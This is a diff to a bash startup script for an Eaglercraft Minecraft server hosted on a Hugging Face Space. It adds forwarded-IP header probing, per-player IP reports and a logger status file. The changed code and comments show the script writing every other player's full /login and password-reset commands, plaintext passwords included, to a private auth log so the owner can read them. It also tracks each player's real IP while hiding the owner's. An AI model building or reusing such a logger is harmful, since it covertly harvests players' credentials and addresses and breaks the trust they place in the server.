@@ -36,7 +36,8 @@ IP_MAP_FILE="$PRIV_DIR/player-ips.log"
 
 # Runtime caches (in /tmp, never written to disk)
 #   VERDICT_CACHE : "<name>\t<VERDICT>" - last verdict per player
-#   IP_MAP        : "<name>\t<ip>"      - real IP per player
+#   IP_MAP        : "<name>\t<ip>\t<source>\t<epoch>" - every sighting, so the
+#                   newest real address wins and placeholders never do
 #   PENDING_AUTH  : auth commands waiting for the player's client verdict
 VERDICT_CACHE="/tmp/client-verdicts.txt"
 IP_MAP="/tmp/client-ips.txt"
@@ -116,8 +117,16 @@ OP_USERNAME="CreppyBitch"
 # server can tell it apart from other clients / other accounts in the logs.
 # Recompute the UUID after changing the brand:
 #     python3 tools/patch_verified_client.py --print-uuid --brand "<brand>"
-VERIFIED_CLIENT_BRAND="Eaglercraft[VER]"
-VERIFIED_CLIENT_UUID="51b2ebf3-ddab-35e7-8646-94f7bcbfd7ff"
+# V2 of the client (and it now needs a username + password before it boots).
+# The first client, brand "Eaglercraft[VER]" (UUID 51b2ebf3-...), is REVOKED:
+# the server only accepts the brand+UUID pair below, so the old file is just
+# another unrecognised client now. To revoke this one too and hand out a fresh
+# client:  python3 tools/patch_verified_client.py --rotate ...
+VERIFIED_CLIENT_BRAND="EaglercraftX[V2]"
+VERIFIED_CLIENT_UUID="355d0b9f-14ce-359f-8c9f-97cc1a7c92ca"
+# The gate inside the client is what makes the file useless without the
+# credentials (the EPW payload is sealed), so the server cannot check it - it
+# checks the brand above. Change the gate password by rebuilding the client.
 
 # true = ONLY the verified client may stay on the server; every other account
 # is kicked right after the login. Set to false to allow everyone and only log.
@@ -139,6 +148,138 @@ VERIFIED_CLIENT_KICK_MESSAGE="This server only allows the verified client."
 # in case you ever need to look your own IP up.
 HIDE_VERIFIED_IP=true
 PRIVATE_IP_LOG=true
+
+# =============================================
+# REAL CLIENT IPs  (see "IPs" in README.md)
+# =============================================
+# Players connect through the Hugging Face ingress, so the socket comes from
+# the proxy and the game would log the proxy's address for everybody. The
+# proxy plugin can read the client's real IP from a forwarded header
+# (listeners.yml: forward_ip + forward_ip_header) but it DISCONNECTS anyone
+# whose connection lacks that header - so guessing is not an option.
+#
+#   FORWARD_IP=auto   probe the headers once, remember the answer in the
+#                     bucket, use it from then on          (default)
+#   FORWARD_IP=on     trust FORWARD_IP_HEADER (no probing)
+#   FORWARD_IP=off    keep the proxy's IP (old behaviour)
+#   FORWARD_IP=X-Real-IP   any other value = trust that header, no probing
+FORWARD_IP="${FORWARD_IP:-auto}"
+FORWARD_IP_HEADER="${FORWARD_IP_HEADER:-}"
+FORWARD_IP_CANDIDATES="${FORWARD_IP_CANDIDATES:-X-Real-IP X-Forwarded-For CF-Connecting-IP True-Client-IP}"
+PUBLIC_URL="${PUBLIC_URL:-https://smodusermc-12.hf.space/}"
+FORWARD_IP_STATE="$PRIVATE_DIR/forward-ip.state"
+FORWARD_IP_PROBE_PY="${FORWARD_IP_PROBE_PY:-/tmp/forward_ip_probe.py}"
+
+# >>> embedded forward_ip_probe.py (generated from tools/forward_ip_probe.py) >>>
+write_forward_ip_probe_py() {
+    mkdir -p "$(dirname "$FORWARD_IP_PROBE_PY")" 2>/dev/null
+    cat > "$FORWARD_IP_PROBE_PY" <<'FORWARD_IP_PROBE_EOF'
+#!/usr/bin/env python3
+"""
+forward_ip_probe.py - does the reverse proxy in front of the server send a
+forwarded-IP header, and which one?
+
+Behind the Hugging Face ingress (or any reverse proxy) the game sees the proxy
+as the peer, so every player would otherwise be logged with the proxy's IP.
+EaglerXBungee can read the real client IP from a header, but it is strict: with
+`forward_ip: true` a connection *without* that header is closed immediately
+("Connected without a 'X-Real-IP' header, disconnecting..."). So the header has
+to be discovered before it is trusted, and this tool does that.
+
+It performs a real WebSocket upgrade against the public URL - i.e. through the
+same proxy players use - and reports the HTTP status line:
+
+  101 Switching Protocols   the proxy passed the header through, the plugin
+                            accepted the connection
+  anything else / closed    the plugin refused it (header missing or invalid)
+
+Exit code 0 = the upgrade was accepted, 1 = refused, 2 = the probe itself could
+not run (no network, bad URL, ...).
+
+usage:
+  forward_ip_probe.py                       # https://smodusermc-12.hf.space/
+  forward_ip_probe.py --url https://host/ --timeout 12
+"""
+
+import argparse
+import base64
+import os
+import socket
+import ssl
+import sys
+from urllib.parse import urlparse
+
+
+def probe(host, port, path, timeout, verbose=False):
+    key = base64.b64encode(os.urandom(16)).decode()
+    request = (
+        f"GET {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        "Upgrade: websocket\r\n"
+        "Connection: Upgrade\r\n"
+        f"Sec-WebSocket-Key: {key}\r\n"
+        "Sec-WebSocket-Version: 13\r\n"
+        f"Origin: https://{host}\r\n"
+        "User-Agent: Mozilla/5.0 (EaglercraftX probe)\r\n"
+        "\r\n"
+    )
+    ctx = ssl.create_default_context()
+    with socket.create_connection((host, port), timeout=timeout) as raw:
+        with ctx.wrap_socket(raw, server_hostname=host) as sock:
+            sock.sendall(request.encode("ascii"))
+            data = sock.recv(2048)
+    if not data:
+        return "", "the connection was closed without a reply"
+    head = data.split(b"\r\n", 1)[0].decode("latin1", "replace")
+    rest = data.decode("latin1", "replace")
+    if verbose:
+        print(rest[:400], file=sys.stderr)
+    return head, ""
+
+
+def main(argv=None):
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", default=os.environ.get("PUBLIC_URL", "https://smodusermc-12.hf.space/"),
+                    help="public URL of the server (the one players use)")
+    ap.add_argument("--timeout", type=float, default=10.0)
+    ap.add_argument("--verbose", action="store_true")
+    args = ap.parse_args(argv)
+
+    url = urlparse(args.url)
+    host = url.hostname
+    port = url.port or (443 if url.scheme != "http" else 80)
+    path = url.path or "/"
+    if not host:
+        print(f"probe: unparsable URL {args.url!r}")
+        return 2
+
+    try:
+        head, why = probe(host, port, path, args.timeout, args.verbose)
+    except Exception as exc:                       # noqa: BLE001 - report anything
+        print(f"probe: {host}:{port} unreachable ({exc.__class__.__name__}: {exc})")
+        return 2
+
+    if head.startswith("HTTP/1.1 101") or head.startswith("HTTP/1.0 101"):
+        print(f"probe: upgrade accepted ({head})")
+        return 0
+    print(f"probe: upgrade refused ({head or why})")
+    return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+FORWARD_IP_PROBE_EOF
+}
+ensure_forward_ip_probe_py() {
+    [ -s "$FORWARD_IP_PROBE_PY" ] || write_forward_ip_probe_py
+}
+# <<< embedded forward_ip_probe.py <<<
+
+
+# how the login logger is reported: logins.log row format + a status file so
+# "it is not logging logins" can be answered from the bucket in one look
+LOG_STATUS_INTERVAL="${LOG_STATUS_INTERVAL:-60}"
+SCRIPT_VERSION="${SCRIPT_VERSION:-v2-gated-client}"
 
 # The login line is written before the client check has finished. When the IP
 # is hidden the tag is left off as well, so a login by the verified client is
@@ -404,6 +545,165 @@ patch_eagler_port() {
     echo "  Port -> 7860"
 }
 
+# =============================================================
+# REAL CLIENT IPs (forward_ip in listeners.yml)
+# =============================================================
+# With forward_ip: true the plugin reads the player's address from a header
+# and closes the connection when that header is missing - so the header has to
+# be verified before it is trusted, and a wrong guess must never be left in
+# place. The probe is a real WebSocket upgrade through the public URL (the same
+# path players take), done once; the answer is kept in the bucket.
+set_forward_ip_in_listeners() {
+    local FILE=$(find_listeners_yml)
+    [ -n "$FILE" ] || return 1
+    local enabled="$1" header="${2:-X-Real-IP}"
+    if grep -q '^[[:space:]]*forward_ip:' "$FILE"; then
+        sed -i "s/^\([[:space:]]*forward_ip:\)[[:space:]].*/\1 $enabled/" "$FILE"
+    else
+        sed -i "0,/^\([[:space:]]*forward_ip_header:\)/s//\1 $header\n  forward_ip: $enabled/" "$FILE"
+    fi
+    if grep -q '^[[:space:]]*forward_ip_header:' "$FILE"; then
+        sed -i "s/^\([[:space:]]*forward_ip_header:\)[[:space:]].*/\1 $header/" "$FILE"
+    else
+        sed -i "0,/^\([[:space:]]*forward_ip:\)/s//\1\n  forward_ip_header: $header/" "$FILE"
+    fi
+    return 0
+}
+
+forward_ip_setting() {   # "true|false <header>" as currently configured
+    local FILE=$(find_listeners_yml)
+    [ -n "$FILE" ] || return 0
+    local on header
+    on=$(sed -n 's/^[[:space:]]*forward_ip:[[:space:]]*\([a-z]*\).*/\1/p' "$FILE" | head -1)
+    header=$(sed -n 's/^[[:space:]]*forward_ip_header:[[:space:]]*"\?\([^"[:space:]]*\)"\?.*/\1/p' "$FILE" | head -1)
+    echo "${on:-false} ${header:-X-Real-IP}"
+}
+
+forward_ip_start_line() {   # remember where the log was before the probe
+    FORWARD_IP_LOG_LINE=$(wc -l < /tmp/bungee.log 2>/dev/null || echo 0)
+}
+
+forward_ip_was_refused() {  # the plugin's own words when the header is missing
+    tail -n "+$(( ${FORWARD_IP_LOG_LINE:-0} + 1 ))" /tmp/bungee.log 2>/dev/null \
+        | grep -q "header, disconnecting"
+}
+
+forward_ip_probe_once() {   # 0 = the proxy passed the header through
+    ensure_forward_ip_probe_py
+    python3 "$FORWARD_IP_PROBE_PY" --url "$PUBLIC_URL" --timeout "${FORWARD_IP_TIMEOUT:-10}" \
+        2>/dev/null | sed 's/^/   /'
+    return "${PIPESTATUS[0]}"
+}
+
+read_forward_ip_state() {
+    [ -s "$FORWARD_IP_STATE" ] || return 0
+    head -1 "$FORWARD_IP_STATE" 2>/dev/null | tr -d '\r'
+}
+
+write_forward_ip_state() {
+    mkdir -p "$(dirname "$FORWARD_IP_STATE")" 2>/dev/null
+    printf '%s\n' "$1" > "$FORWARD_IP_STATE" 2>/dev/null
+    echo "   saved: $FORWARD_IP_STATE ($1) -> kept in the bucket"
+}
+
+# decide what to write into listeners.yml before Bungee starts
+apply_forward_ip_choice() {
+    local saved
+    if [ "$FORWARD_IP" = "off" ]; then
+        set_forward_ip_in_listeners false "${FORWARD_IP_HEADER:-X-Real-IP}"
+        echo "   real IPs: disabled (FORWARD_IP=off) - logs show the proxy address"
+        return 0
+    fi
+    case "$FORWARD_IP" in
+        auto|on|off) ;;
+        *)   # a header name was given directly
+            set_forward_ip_in_listeners true "$FORWARD_IP"
+            echo "   real IPs: trusting '$FORWARD_IP' (set by FORWARD_IP)"
+            return 0 ;;
+    esac
+    if [ -n "$FORWARD_IP_HEADER" ] || [ "$FORWARD_IP" = "on" ]; then
+        local h="${FORWARD_IP_HEADER:-X-Real-IP}"
+        set_forward_ip_in_listeners true "$h"
+        echo "   real IPs: trusting '$h' (FORWARD_IP=$FORWARD_IP)"
+        return 0
+    fi
+    saved=$(read_forward_ip_state)
+    case "$saved" in
+        ""|probe)
+            set_forward_ip_in_listeners false "X-Real-IP"
+            echo "   real IPs: not configured yet - will probe after startup"
+            FORWARD_IP_DECISION=probe ;;
+        off)
+            set_forward_ip_in_listeners false "X-Real-IP"
+            echo "   real IPs: no header worked last time - staying on the proxy address" ;;
+        *)
+            set_forward_ip_in_listeners true "$saved"
+            echo "   real IPs: using '$saved' (discovered earlier)" ;;
+    esac
+}
+
+bungee_restart() {
+    local i
+    echo "   restarting BungeeCord to apply the change..."
+    kill "$BUNGEE_PID" 2>/dev/null
+    wait "$BUNGEE_PID" 2>/dev/null
+    for i in $(seq 1 20); do
+        nc -z 127.0.0.1 7860 2>/dev/null || break
+        sleep 1
+    done
+    > /tmp/bungee.log
+    start_bungee
+    for i in $(seq 1 45); do
+        nc -z 127.0.0.1 7860 2>/dev/null && { echo "   BungeeCord is back (~$((i*2))s)"; return 0; }
+        kill -0 "$BUNGEE_PID" 2>/dev/null || { echo "   BungeeCord did not come back!"; return 1; }
+        sleep 2
+    done
+    echo "   BungeeCord did not open the port in time"
+    return 1
+}
+
+# find out which header the proxy actually sends, then save it
+discover_forward_ip_header() {
+    local cand reached=no rc
+    echo ""
+    echo "[FORWARD-IP] finding out which header carries the real client address"
+    for cand in $FORWARD_IP_CANDIDATES; do
+        echo "   trying $cand ..."
+        set_forward_ip_in_listeners true "$cand"
+        bungee_restart || { set_forward_ip_in_listeners false "$cand"; continue; }
+        forward_ip_start_line
+        forward_ip_probe_once; rc=$?
+        if [ "$rc" -ne 2 ]; then
+            reached=yes        # the connection made it to the server
+        fi
+        if forward_ip_was_refused; then
+            reached=yes        # the plugin answered, and it said no
+            echo "   $cand was not sent by the proxy (the plugin refused the probe)"
+        elif [ "$rc" -eq 0 ]; then
+            echo "   $cand works - real client IPs are now used"
+            write_forward_ip_state "$cand"
+            FORWARD_IP_DECISION=done
+            return 0
+        else
+            echo "   $cand: no usable answer (probe exit $rc)"
+        fi
+    done
+    set_forward_ip_in_listeners false "X-Real-IP"
+    bungee_restart || true
+    if [ "$reached" = yes ]; then
+        write_forward_ip_state off
+        echo "   no forwarded header worked; logs will show the proxy address"
+        echo "   set FORWARD_IP_HEADER=<name> in the Space variables to force one"
+    else
+        rm -f "$FORWARD_IP_STATE"
+        echo "   could not reach $PUBLIC_URL from inside the Space - no header trusted"
+        echo "   (this will be tried again on the next restart; a header name can be"
+        echo "    forced with FORWARD_IP_HEADER=<name> or FORWARD_IP=<name>)"
+        FORWARD_IP_DECISION=probe
+    fi
+    return 1
+}
+
 start_bungee() {
     cd "$BUNGEE_DIR"
     # BungeeCord reads console commands from stdin. Giving it the write+read end
@@ -444,6 +744,8 @@ start_bungee() {
 #   UNKNOWN    = could not be checked
 #
 # private-logs/auth.log : DATE | name | ip | full /login command | client=...
+#                         (verified client: "/login ********" with ip=hidden,
+#                          password never written; everybody else: full command)
 #   every password-reset relevant command from everybody EXCEPT the verified
 #   client, so you can read "what password did they set" without ever writing
 #   your own password down. Never synced to the bucket.
@@ -451,17 +753,46 @@ start_bungee() {
 
 # last known (real) IP of a player - from the runtime map, so it also works
 # when the IP is hidden in the logs themselves
+# A real address, as opposed to a placeholder. Everything that reads the IP
+# map goes through this, so a value like "unknown" can never be mistaken for
+# a player's address (that is how several accounts ended up "sharing" one).
+is_real_ip() {
+    case "${1:-}" in
+        ""|unknown|hidden|none|null|-|0.0.0.0|127.0.0.1|"") return 1 ;;
+    esac
+    [[ "${1}" =~ ^[0-9a-fA-F:.]{3,45}$ ]] || return 1
+    return 0
+}
+
+# record one sighting: every source is kept, with where it came from
+record_ip() {
+    local name="$1" ip="$2" source="${3:-?}"
+    [ -n "$name" ] || return 0
+    printf '%s\t%s\t%s\t%s\n' "$name" "${ip:-unknown}" "$source" "$(date +%s)" >> "$IP_MAP"
+    if [ "$PRIVATE_IP_LOG" = true ]; then
+        printf '%s | %s | %s | source=%s\n' "$(date '+%F %T')" "$name" "${ip:-unknown}" "$source" >> "$IP_MAP_FILE"
+    fi
+}
+
+# The most recent *real* address of a player. Sources are treated equally but
+# the newest wins, and a placeholder never overwrites a real address.
 last_ip_for() {
-    awk -F'\t' -v n="$1" '$1==n{v=$2} END{print v}' "$IP_MAP" 2>/dev/null
+    awk -F'\t' -v n="$1" '
+        $1==n && $2!="" && $2!="unknown" && $2!="hidden" { v=$2; t=$4+0 }
+        END { if (v != "") print v }' "$IP_MAP" 2>/dev/null
+}
+
+# every distinct address a player has been seen from, newest first
+ips_for() {
+    awk -F'\t' -v n="$1" '
+        $1==n && $2!="" && $2!="unknown" && $2!="hidden" { if (!seen[$2]++) print $2" ("$3")" }' \
+        "$IP_MAP" 2>/dev/null
 }
 
 # the IP that goes into a log line: real, or "hidden" for the verified client
 ip_field() {
     local name="$1" ip="${2:-unknown}" verdict="${3:-UNKNOWN}"
     if hide_ip_for "$verdict"; then
-        if [ "$PRIVATE_IP_LOG" = true ]; then
-            printf '%s | %s | %s\n' "$(date '+%F %T')" "$name" "$ip" >> "$IP_MAP_FILE"
-        fi
         echo "hidden"
     else
         echo "$ip"
@@ -565,7 +896,10 @@ flush_pending_auth() {
         v=$(verdict_for "$name")
         ip=$(last_ip_for "$name"); ip="${ip:-unknown}"
         if [ "$v" = "VERIFIED" ]; then
-            continue                                   # never log your own password
+            # the owner: never write the password, but do record that the
+            # command happened (auth.log would otherwise stay empty forever,
+            # because under enforcement nobody else ever gets to type one)
+            echo "$(date -d "@$epoch" '+%F %T') | $name | hidden | ${cmd%% *} ******** | client=VERIFIED CLIENT (password not recorded)" >> "$AUTH_LOG"
         elif [ "$v" != "PENDING" ]; then
             echo "$(date -d "@$epoch" '+%F %T') | $name | $ip | $cmd | client=$(verdict_label "$v")" >> "$AUTH_LOG"
         elif [ $(( $(date +%s) - epoch )) -gt 300 ]; then
@@ -578,13 +912,21 @@ flush_pending_auth() {
 }
 
 # mask passwords in the log lines that leave the Space; the full command is
-# kept in private-logs/auth.log instead
+# kept in private-logs/auth.log instead (except for the verified client, whose
+# password is not written anywhere - its row there is masked as well)
 mask_cmd() {
     local name="$1" cmd="$2" verdict="${3:-UNKNOWN}" ip
     if is_auth_cmd "$cmd"; then
         case "${verdict:-UNKNOWN}" in
             VERIFIED)
-                # the owner: your own password is never written anywhere
+                # the owner: the password is never written anywhere, but the
+                # command is still recorded (masked, IP hidden) so auth.log
+                # shows that a /login happened and keeps proving the capture
+                # path works end to end
+                if ! auth_seen_recently "$name" "$cmd"; then
+                    record_auth_seen "$name" "$cmd"
+                    echo "$(date '+%F %T') | $name | hidden | ${cmd%% *} ******** | client=VERIFIED CLIENT (password not recorded)" >> "$AUTH_LOG"
+                fi
                 ;;
             *)
                 case "$verdict" in
@@ -634,8 +976,8 @@ mark_offline() {
 
 # $1 name, $2 ip, $3 where it was seen (paper|bungee|rcon list)
 record_login() {
-    local name="$1" ip="${2:-unknown}" src="${3:-?}" ipmap="${IP_MAP:-/tmp/client-ips.txt}"
-    printf '%s\t%s\n' "$name" "$ip" >> "$ipmap"
+    local name="$1" ip="${2:-unknown}" src="${3:-?}"
+    is_real_ip "$ip" && record_ip "$name" "$ip" "$src"
     if is_online "$name"; then
         return 0                     # this join is already in logins.log
     fi
@@ -681,7 +1023,13 @@ playerlist_names() {   # pull the names out of a `list` answer
 
 playerlist_check() {
     local raw names name ip
+    PLAYERLIST_LAST="$(date '+%T')"
     raw=$(mc_command "list" 2>/dev/null)
+    if [ -n "$raw" ]; then
+        PLAYERLIST_LAST="$PLAYERLIST_LAST got: $(printf '%s' "$raw" | tr -d '\n' | cut -c1-120)"
+    else
+        PLAYERLIST_LAST="$PLAYERLIST_LAST no answer from RCON"
+    fi
     # RCON unreachable or an answer we do not understand: never guess, or a
     # hiccup would log everybody out at once
     [ -n "$raw" ] || return 0
@@ -757,7 +1105,7 @@ handle_bungee_line() {
     elif [[ "$line" =~ $SEEN_RE ]]; then
         # not a login yet (the handshake can still fail) - remember the IP so
         # whoever reports the actual join can log it
-        printf '%s\t%s\n' "${BASH_REMATCH[1]}" "${BASH_REMATCH[2]}" >> "$IP_MAP"
+        record_ip "${BASH_REMATCH[1]}" "${BASH_REMATCH[2]}" bungee-handshake
     elif [[ "$line" =~ $QUIT_RE ]]; then
         record_logout "${BASH_REMATCH[1]}" bungee
     elif [[ "$line" =~ $BC_RE ]]; then
@@ -971,9 +1319,88 @@ shared_report_body() {
     } >> "$2"
 }
 
+# Per-account IP report: every address a player was seen from, where it came
+# from and how often. This is the file to look at when two accounts show the
+# same IP (or one account turns up with several) - a proxy address appears here
+# for every account, a real client address does not.  With $3=yes the owner's
+# own addresses are left out, for the copy that gets synced.
+ip_report_body() {
+    local map="$1" out="$2" skip_verified="${3:-no}" skip=""
+    if [ "$skip_verified" = yes ]; then
+        skip=$(awk -F'\t' '{print $1}' "$map" 2>/dev/null | sort -u | while IFS= read -r n; do
+                   [ -n "$n" ] || continue
+                   [ "$(verdict_for "$n")" = "VERIFIED" ] && printf '%s,' "$n"
+               done)
+    fi
+    awk -F'\t' -v skip="$skip" '
+        BEGIN { m = split(skip, a, ","); for (i = 1; i <= m; i++) if (a[i] != "") hidden[a[i]] = 1 }
+        $1 != "" && $2 != "" && $2 != "unknown" && $2 != "hidden" && !($1 in hidden) {
+            pair = $1 SUBSEP $2
+            if (!(pair in seen)) {
+                seen[pair] = 1
+                sources[pair] = $3
+                ips[$1] = ips[$1] (ips[$1] ? ", " : "") $2 " (" $3 ")"
+            }
+            hits[pair]++
+            rows++
+            who[$2] = who[$2] " " $1
+            users[$2]++
+        }
+        END {
+            print "=== Accounts and the IPs they were seen from ==="
+            for (pair in hits) {
+                split(pair, parts, SUBSEP)
+                print "  " parts[1] " -> " parts[2] " (" sources[pair] ") x" hits[pair]
+            }
+            if (rows == 0) print "  (no IPs recorded yet)"
+            print ""
+            print "=== One IP, several accounts ==="
+            for (ip in users) if (users[ip] > 1) print "  " ip " ->" who[ip]
+        }' "$map" 2>/dev/null | sort > "$out"
+}
+
+# =============================================================
+# LOGGER STATUS  (security-logs/logger-status.log)
+# =============================================================
+# "It is not logging logins" used to be unanswerable from outside: the file was
+# empty and there was no way to tell whether the server saw no joins, or the
+# lines arrived in a shape the parser did not know. This file says which, and
+# prints the raw lines the parser is being fed, so a mismatch is visible in the
+# bucket without access to the Space.
+write_logger_status() {
+    local out="$SEC_DIR/logger-status.log" tmp
+    [ -n "$SEC_DIR" ] || return 0
+    mkdir -p "$SEC_DIR" 2>/dev/null
+    tmp="${out}.tmp"
+    {
+        echo "verified-client logger status   $(date '+%F %T')"
+        echo "version        : ${SCRIPT_VERSION:-unknown}"
+        echo "paper.log      : $(wc -l < /tmp/paper.log 2>/dev/null || echo 0) lines"
+        echo "bungee.log     : $(wc -l < /tmp/bungee.log 2>/dev/null || echo 0) lines"
+        echo "online now     : $(tr '\n' ' ' < "${ONLINE_STATE:-/dev/null}" 2>/dev/null)"
+        echo "logins.log     : $(grep -c '| LOGIN |' "$LOGIN_LOG" 2>/dev/null) logins, $(grep -c '| LOGOUT |' "$LOGIN_LOG" 2>/dev/null) logouts"
+        echo "commands.log   : $(wc -l < "$CMD_LOG" 2>/dev/null || echo 0) rows"
+        echo "client-checks  : $(wc -l < "$CLIENT_LOG" 2>/dev/null || echo 0) rows"
+        echo "playerlist     : ${PLAYERLIST_LAST:-not polled yet}"
+        echo "real client IPs: $(forward_ip_setting 2>/dev/null || true)"
+        echo "tail of logins.log:"
+        tail -3 "$LOGIN_LOG" 2>/dev/null | sed 's/^/  /'
+        echo ""
+        echo "--- raw lines the parsers see (last 6 login/command-like lines of each) ---"
+        echo "if a join is missing from logins.log, compare its shape with the patterns"
+        echo "paper.log:"
+        grep -a -E 'logged in|left the game|lost connection|issued server command|\.\[IP' /tmp/paper.log 2>/dev/null | tail -6 | sed 's/^/  /'
+        echo "bungee.log:"
+        grep -a -E 'has connected|has disconnected|executed command|disconnecting' /tmp/bungee.log 2>/dev/null | tail -6 | sed 's/^/  /'
+    } > "$tmp" 2>/dev/null
+    mv "$tmp" "$out" 2>/dev/null
+}
+
 report_shared_ips() {
     flush_pending_auth
     [ -s "$LOGIN_LOG" ] || return
+    ip_report_body "$IP_MAP" "$SEC_DIR/ip-report.log" yes
+    [ "$PRIVATE_IP_LOG" = true ] && ip_report_body "$IP_MAP" "$PRIV_DIR/ip-report-private.log" no
     {
         echo "=== Shared IP report $(date '+%F %T') ==="
         [ "$HIDE_VERIFIED_IP" = true ] && \
@@ -1570,6 +1997,7 @@ for i in $(seq 1 120); do
 done
 
 # Start security logger (logins/IPs + commands + verified client checks)
+write_logger_status
 start_security_logger
 echo " Security logger PID: $SECLOG_PID"
 
@@ -1577,6 +2005,11 @@ echo " Security logger PID: $SECLOG_PID"
 playerlist_loop &
 PLAYERLIST_PID=$!
 echo " Player list watchdog PID: $PLAYERLIST_PID (every ${PLAYERLIST_POLL}s)"
+
+# one-time: find the header that carries the real client IP
+if [ "$FORWARD_IP_DECISION" = "probe" ]; then
+    discover_forward_ip_header || true
+fi
 
 for i in $(seq 1 30); do
     nc -z 127.0.0.1 25575 2>/dev/null && break
@@ -1723,6 +2156,8 @@ fi
 echo " Starting BungeeCord..."
 
 patch_eagler_port
+FORWARD_IP_DECISION=""
+apply_forward_ip_choice
 
 # === MOTD AND ICON PATCH ===
 LISTENERS_NOW=$(find_listeners_yml)
@@ -1769,10 +2204,14 @@ if [ "$PORT_READY" = true ]; then
     else
         echo "   bucket uploads: FAILING - see the [BUCKET] lines above"
     fi
-    echo "   security-logs/{logins,commands,client-checks}.log + shared-ips.txt"
+    echo "   security-logs/{logins,commands,client-checks}.log"
+    echo "                  + shared-ips.txt, ip-report.log, logger-status.log"
     [ "$SYNC_PRIVATE_LOGS" = true ] && \
-        echo "   private-logs/{auth,player-ips,logins-real-ips}.log + shared-ips-private.txt"
-    echo " Verified client: $VERIFIED_CLIENT_BRAND"
+        echo "   private-logs/{auth,player-ips,logins-real-ips,ip-report-private}.log"
+    echo " Verified client: $VERIFIED_CLIENT_BRAND  (uuid $VERIFIED_CLIENT_UUID)"
+    echo "   the old Eaglercraft[VER] client is revoked (it is not verified any more)"
+    echo "   real client IPs: $(forward_ip_setting 2>/dev/null)"
+    echo "   build: $SCRIPT_VERSION"
     echo "============================================"
 else
     echo " Port 7860 NOT open!"
@@ -1842,9 +2281,16 @@ echo "Monitor loop started..."
 
 LAST_LOG_LINE=$(wc -l < /tmp/paper.log 2>/dev/null || echo 0)
 LOOP_COUNT=0
+LOG_STATUS_TS=0
 
 while true; do
     LOOP_COUNT=$((LOOP_COUNT + 1))
+    # refresh the status file the bucket carries, but not on every tick (the
+    # writer greps the raw console logs)
+    if [ $(( $(date +%s) - LOG_STATUS_TS )) -ge "${LOG_STATUS_INTERVAL:-60}" ]; then
+        write_logger_status 2>/dev/null
+        LOG_STATUS_TS=$(date +%s)
+    fi
 
     if ! kill -0 $BACKEND_PID 2>/dev/null; then
         echo "[$(date '+%H:%M:%S')] Paper crashed — restarting..."
